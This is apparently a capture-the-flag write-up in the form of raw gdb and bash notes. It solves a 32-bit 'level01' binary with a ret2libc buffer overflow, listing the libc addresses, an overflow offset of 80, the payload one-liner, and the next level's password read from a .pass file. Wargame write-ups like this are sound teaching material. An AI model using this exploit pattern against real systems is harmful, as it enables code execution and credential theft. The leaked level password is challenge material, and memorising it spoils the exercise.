gdb:
	> b main
	> r
	> info proc map
<<< Start Addr   End Addr       Size     Offset objfile
<<< ...
<<< 0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
<<< ...
	> p system
<<< $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
	> p exit
<<< $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
	> c
### https://wiremask.eu/tools/buffer-overflow-pattern-generator/
	> r < <(python -c "print 'dat_wil\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9'")
<<< Program received signal SIGSEGV, Segmentation fault.
0x41306141 in ?? ()
Overflow at offset 80

exit gdb

bash:
	> strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
<<< 15d7ec /bin/sh

### "/bin/sh" = 0xf7e2c000 + 15d7ec = F7F897EC

	> python -c "print 'dat_wil\n' + 'A'*80 + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xF7\xF8\x97\xEC'[::-1]" > /tmp/payload01
	> cat /tmp/payload01 - | ./level01
	> cat /home/users/level02/.pass
<<< PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv